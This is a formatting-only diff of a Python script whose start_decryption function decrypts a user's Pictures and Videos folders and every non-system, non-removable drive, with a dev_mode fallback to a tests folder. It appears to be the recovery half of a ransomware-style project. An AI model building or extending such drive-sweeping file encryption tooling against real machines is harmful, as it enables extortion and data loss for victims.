@@ -82,20 +82,18 @@ def start_decryption():
         decrypt_directory(
             os.path.join(rf"C:\Users\{getpass.getuser()}", "Pictures"), key
         )
-        decrypt_directory(
-            os.path.join(rf"C:\Users\{getpass.getuser()}", "Videos"), key
-        )
+        decrypt_directory(os.path.join(rf"C:\Users\{getpass.getuser()}", "Videos"), key)
         bitmask = ctypes.windll.kernel32.GetLogicalDrives()
         for disk in [
-             f"{letter}:\\"
-             for i, letter in enumerate(string.ascii_uppercase)
-             if bitmask & (1 << i)
-         ]:
-             if (
-                 disk[:1] != os.getenv("SystemDrive")
-                 and disk[:1] != os.getenv("HOMEDRIVE")
-                 and ctypes.windll.kernel32.GetDriveTypeW(disk) != 2
-             ):
+            f"{letter}:\\"
+            for i, letter in enumerate(string.ascii_uppercase)
+            if bitmask & (1 << i)
+        ]:
+            if (
+                disk[:1] != os.getenv("SystemDrive")
+                and disk[:1] != os.getenv("HOMEDRIVE")
+                and ctypes.windll.kernel32.GetDriveTypeW(disk) != 2
+            ):
                 decrypt_directory(disk, key)
     else:
         decrypt_directory(r".\tests", key)
@@ -135,4 +133,3 @@ def main():
 dev_mode = True
 if __name__ == "__main__":
     main()
-
